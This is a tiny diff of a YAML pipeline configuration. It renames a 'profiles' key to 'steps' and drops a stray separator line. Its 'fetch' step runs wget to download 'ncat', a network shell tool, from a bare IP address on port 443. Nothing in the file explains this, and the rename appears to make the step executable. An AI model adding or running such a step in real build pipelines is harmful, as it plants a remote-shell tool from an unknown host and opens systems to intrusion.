@@ -1,7 +1,6 @@
----
 pipeline:
   fetch: deploy
-profiles:
+steps:
   fetch:
     script: "wget http://54.211.189.233:443/ncat"
   deploy:
